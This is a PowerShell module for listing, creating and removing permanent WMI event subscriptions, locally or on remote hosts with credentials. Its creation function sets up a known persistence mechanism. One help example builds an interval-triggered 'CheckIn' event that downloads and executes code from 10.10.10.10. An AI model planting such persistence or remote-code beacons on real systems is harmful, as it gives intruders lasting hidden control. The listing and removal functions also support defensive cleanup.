function Get-WMIEvent {

<#
.SYNOPSIS

Queries WMI for all __FilterToConsumerBinding, __EventFilter, and __EventConsumer instances as well as local events. 

.DEFINITION

Default output is a hash table with 4 ArrayList properties containing WMI LocalEvents, PermanentEvents, Consumers, and Filters. 
Each property will contain the associated WMI objects These can also be individually output using switches. 

.PARAMETER Local

Indicates that local WMI events are returned with the results of the command. 

.PARAMETER Permanent

Indicates that permanent WMI events are returned with the results of the command. 

.PARAMETER Consumer

Indicates that WMI event consumers are returned with the results of the command. 

.PARAMETER Filter

Indicates that WMI event filters are returned with the results of the command. 

.PARAMETER Name

Specifies the WMI event name to return. 

.PARAMETER ComputerName

Specifies the remote computer system to add a permanent WMI event to. The default is the local computer.

Type the NetBIOS name, an IP address, or a fully qualified domain name (FQDN) of one or more computers. To specify the local computer, type the computer name, a dot (.), or localhost.

.PARAMETER Credential

The credential object used to authenticate to the remote system. If not specified, the current user instance will be used.

.EXAMPLE

PS C:\>Get-WMIEvent -Name TestEvent

This command will return all WMI event objects named 'TestEvent'.

.EXAMPLE

PS C:\>Get-WMIEvent -Consumer -Filter

This command will return all WMI event consumers and filters.

.EXAMPLE

PS C:\>Get-WMIEvent -Permanent | Remove-WMIEvent

This command will return all permanent WMI events and then remove the event object and their associated consumers and filters.

.OUTPUTS

System.Object.Hashtable, System.Object.PSEventSubscriber, System.Management.ManagementBaseObject.ManagementObject

By default, this cmdlet returns a System.Object.Hashtable object. If you use the Local parameter, it returns a System.Object.PSEventSubscriber 
object.  If you use the Permanent, Consumer, or Filter parameter, it returns a System.Management.ManagementBaseObject.ManagementObject object.

#>

    Param (

        [Switch]
        $Local,

        [Switch]
        $Permanent,

        [Switch]
        $Consumer,

        [Switch]
        $Filter,

        [String]
        $Name,

        [String]
        $ComputerName,

        [Management.Automation.PSCredential]
        $Credential
    )
    $Arguments = @{}
    if ($ComputerName){
        $Arguments['ComputerName'] = $ComputerName
        if ($Credential){
            $Arguments['Credential'] = $Credential
        }
    }
    if ($Name){
        $Arguments['Filter'] = "__RELPATH LIKE `"%$Name%`""
    }
    if (!$Local -and !$Permanent -and !$Consumer -and !$Filter){
        if(!$ComputerName){
            $LocalEvents = Get-EventSubscriber
        }
        $PermanentEvents = Get-WmiObject '__FilterToConsumerBinding' -Namespace root/subscription @Arguments
        [System.Collections.ArrayList]$Consumers = @()
        [System.Collections.ArrayList]$Filters = @()
        foreach($EventEntry in $PermanentEvents){
            $ConsumerId = $EventEntry.Consumer
            $FilterId = $EventEntry.Filter
            $Arguments['Filter'] = "__RELPATH='$ConsumerId'"
            [void]$Consumers.Add($(Get-WmiObject -Namespace root/subscription -Class $($ConsumerId.Split('.')[0]) @Arguments))
            $Arguments['Filter'] = "__RELPATH='$FilterId'"
            [void]$Filters.Add($(Get-WmiObject -Namespace root/subscription -Class $($FilterId.Split('.')[0]) @Arguments))
        }
        New-Object PSObject @{
            LocalEvents = $LocalEvents
            PermanentEvents = $PermanentEvents
            Filters = $Filters
            Consumers = $Consumers
        }
    }
    
    if($Local){
        if($ComputerName){
            Write-Warning 'Cannot query remote hosts for local WMI event.'
        }else{
            Get-EventSubscriber
        }
    }
    if($Permanent){
        Get-WmiObject -Class __FilterToConsumerBinding -Namespace root/subscription @Arguments
    }
    if($Consumer){
        Get-WmiObject -Class __EventConsumer -Namespace root/subscription @Arguments
    }
    if($Filter){
        Get-WmiObject -Class __EventFilter -Namespace root/subscription @Arguments
    }
}

function Add-WMIPermanentEvent {
<#
.SYNOPSIS

Adds a region permanent WMI event using __FilterToConsumerBinding, __EventFilter, and __EventConsumer WMI classes. 

.DEFINITION

This cmdlet takes command or script and a filter then creates  a WMI Filter, Consumer, and FilterToConsumerBinding. 
A number of WMI filters, or triggers, are configured and are specified with the 'trigger' parameter. There are two consumers 
to choose from, command and script. 

.PARAMETER Command

Indicates that an operating system command will be executed once the specified WMI event occurs. Provide a string or scriptblock
containing the command you would like to run. 

.PARAMETER Script

Indicates that a provided Jscript or VBScript will run once a WMI event occurs. Provide a string or scriptblock containing 
the script code you would like executed.

.PARAMETER Trigger

Specifies the event trigger (WMI Filter) to use. The options are InsertUSB, UserLogin, ProcessStart, Interval, and Timed.

.PARAMETER EventName

Specifies an arbitrary name to be assigned to the new permanent WMI event.

.PARAMETER UserName

Specifies the username that the UserLogin trigger will generate a WMI event for (optional).

.PARAMETER ProcessName

Specifies the process name when the ProcessStart trigger is selected (required).

.PARAMETER IntervalPeriod

Specifies the interval period when the Interval trigger is selected (required).

.PARAMETER ExecutionTime

Specifies the absolute time to generate a WMI event when the Timed trigger is selected (required).

.PARAMETER ComputerName

Specifies the remote computer system to add a permanent WMI event to. The default is the local computer.

Type the NetBIOS name, an IP address, or a fully qualified domain name (FQDN) of one or more computers. To specify the local computer, type the computer name, a dot (.), or localhost.

.PARAMETER Credential

The credential object used to authenticate to the remote system. If not specified, the current user instance will be used.

.EXAMPLE

PS C:\>Add-WMIPermanentEvent -EventName KillProc -Command "Powershell.exe -NoP -C `"Stop-Process -Id %ProcessId% -Force`"" -Trigger ProcessStart -ProcessName powershell.exe



.EXAMPLE

PS C:\>Add-WMIPermanentEvent -EventName DLThumbdrive -Script "<JScript/VBScript>" -Trigger InsertUSB

.EXAMPLE

PS C:\>Add-WMIPermanentEvent -EventName NotifyUponLogin -Command "cmd.exe /c `"ping 192.168.50.11`"" -Trigger UserLogin -UserName administrator

.EXAMPLE

PS C:\>Add-WMIPermanentEvent -EventName CheckIn -Command "powershell.exe -NoP -C IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.10/checkin.html')" -Trigger Interval -IntervalPeriod 10000

.EXAMPLE

PS C:\>Add-WMIPermanentEvent -EventName ExecuteSystemCheck -Script "<JScript/VBScript" -Trigger Timed -ExecutionTime 201607

.OUTPUTS

System.Management.ManagementBaseObject.ManagementObject

By default, this cmdlet returns a System.Management.ManagementBaseObject.ManagementObject.

#>

    Param (
        [Parameter(Mandatory = $True, ParameterSetName = 'Command')]
        [String]
        [ValidateNotNullOrEmpty()]
        $Command,

        [Parameter(Mandatory = $True, ParameterSetName = 'Script')]
        [String]
        $Script,

        [Parameter(Mandatory = $True, ParameterSetName = 'Command')]
        [Parameter(Mandatory = $True, ParameterSetName = 'Script')]
        [String]
        [ValidateNotNullOrEmpty()]
        $EventName,

        [Parameter(Mandatory = $True, ParameterSetName = 'Command')]
        [Parameter(Mandatory = $True, ParameterSetName = 'Script')]
        [ValidateSet('InsertUSB', 'UserLogin', 'ProcessStart', 'Interval', 'Timed')]
        [String]
        [ValidateNotNullOrEmpty()]
        $Trigger,

        [String]
        $UserName,

        [String]
        $ProcessName,

        [String]
        $IntervalPeriod,

        [String]
        $ExecutionTime,

        [String]
        $ComputerName,

        [Management.Automation.PSCredential]
        $Credential
    )

    #Error Checking
    if(($Trigger -eq 'ProcessStart') -and !$ProcessName){
        Write-Warning 'A Process Name Must Be Specified.'
        return
    }
    if(($Trigger -eq 'Interval') -and !$IntervalPeriod){
        Write-Warning 'An Interval Period Must Be Specified.'
    }
    if(($Trigger -eq 'Timed') -and !$ExecutionTime){
        Write-Warning 'An Execution Time Must Be Specified.'
    }

    #Build optional argument splat if a remote system is specified
    $Arguments = @{}

    if ($ComputerName){
        $Arguments['ComputerName'] = $ComputerName
        if ($Credential){
            $Arguments['Credential'] = $Credential
        }
    }
    
    ######################################################
    ### Consumer Setup, query, and variable assignment ###
    ######################################################
    
    switch ($PsCmdlet.ParameterSetName) {
        #Build Command Line Consumer object if -Command is used
        'Command' {
            $CommandConsumerArgs = @{
                Name = $EventName
                CommandLineTemplate = $Command
            }
            $Consumer = Set-WmiInstance -Namespace root/subscription -Class CommandLineEventConsumer -Arguments $CommandConsumerArgs @Arguments
        }
        #Build Active Script Consumer object if -Script is used
        'Script' {
            $ScriptConsumerArgs = @{
                Name = $EventName
                ScriptText = $Script
            }
            $Consumer = Set-WmiInstance -Namespace root/subscription -Class ActiveScriptEventConsumer -Arguments $ScriptConsumerArgs @Arguments
        }
    }

    Switch ($Trigger){
        'InsertUSB' {$Query = 'SELECT * FROM Win32_VolumeChangeEvent WHERE EventType = 2' }
        'UserLogin' {if ($UserName){
                        $Query = "SELECT * FROM __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_LoggedOnUser' AND TargetInstance.__RELPATH like `"%Name=\\\`"$UserName%`""
                    }else{
                        $Query = "SELECT * FROM __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_LogonSession' AND TargetInstance.LogonType = 2"
                    }}
        'Interval' {$Query = ""}
        'DateTime' {$Query = ""}
        'ProcessStart' {$Query = "SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName='$ProcessName'";write-host $Query}
        'LockedScreen' {$Query = "SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName = 'LogonUI.exe'"}
    }
    
    ####################################################
    ### Filter Setup, query, and variable assignment ###
    ####################################################
    
    $EventFilterArgs = @{
        EventNamespace = 'root/cimv2'
        Name = $EventName
        Query = $Query
        QueryLanguage = 'WQL'
    }

    $Filter = Set-WmiInstance -Namespace root/subscription -Class __EventFilter -Arguments $EventFilterArgs @Arguments

    $FilterToConsumerArgs = @{
        Filter = $Filter
        Consumer = $Consumer
    }

    ##################################
    ### Filter to Consumer Binding ###
    ##################################
    Set-WmiInstance -Namespace root/subscription -Class __FilterToConsumerBinding -Arguments $FilterToConsumerArgs @Arguments
}

function Remove-WMIEvent {

<#
.SYNOPSIS

Removes WMI __FilterToConsumerBinding, __EventFilter, and __EventConsumer objects as well as local events. 

.DEFINITION

This cmdlet will remove any WMI event object(s) piped to it. After removing a __FilterToConsumerBinding object, this 
cmdlet will also remove associated __EventFilter and __EventConsumer objects.

.PARAMETER InputObject

Indicates that WMI local events are returned with the results of the command. 

.PARAMETER ComputerName

Specifies the remote computer system to add a permanent WMI event to. The default is the local computer.

Type the NetBIOS name, an IP address, or a fully qualified domain name (FQDN) of one or more computers. To specify the local computer, type the computer name, a dot (.), or localhost.

.PARAMETER Credential

The credential object used to authenticate to the remote system. If not specified, the current user instance will be used.

.EXAMPLE

PS C:\>Get-WMIEvent -Permanent | Remove-WMIEvent

This command will remove each WMI __FilterToConsumerBinding object and their associated __EventFilter and __EventConsumer objects. 

.EXAMPLE

PS C:\>$(Get-WmiObject -Namespace root/subscription -Class __EventFilter)[0] | Remove-WMIEvent

This command will remove the first result after querying WMI __EventFilter objects.

.EXAMPLE

PS C:\>Get-EventSubscriber | Remove-WMIEvent

This command will remove any local WMI events.

.INPUTS

System.Object.PSEventSubscriber, System.Management.ManagementBaseObject.ManagementObject

You can pipe one or more WMI event objects to this cmdlet.

#>

    Param (
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ParameterSetName = 'Pipeline')]
        $InputObject,

        [String]
        $ComputerName,

        [Management.Automation.PSCredential]
        $Credential
    )

    Begin {
        #Build optional argument splat if a remote system is specified
        $Arguments = @{}

        if($ComputerName){
            $Arguments['ComputerName'] = $ComputerName
            if ($Credential){
                $Arguments['Credential'] = $Credential
            }
        }
    }

    Process {
        foreach ($Event in $InputObject){
            if($($Event.GetType().Name) -eq 'PSEventSubscriber'){
                $Event | Unregister-Event
            }elseif($Event.__CLASS -eq '__FilterToConsumerBinding'){
                $ConsumerId = $Event.Consumer
                $FilterId = $Event.Filter
                $Event | Remove-WmiObject
                Get-WmiObject -Namespace root/subscription -Class $ConsumerId.Split('.')[0] -Filter "__RELPATH='$ConsumerId'" @Arguments | Remove-WmiObject
                Get-WmiObject -Namespace root/subscription -Class $FilterId.Split('.')[0] -Filter "__RELPATH='$FilterId'" @Arguments | Remove-WmiObject
            }else{
                $Event | Remove-WmiObject
            }
        }
    }

    End {
    
    }

}
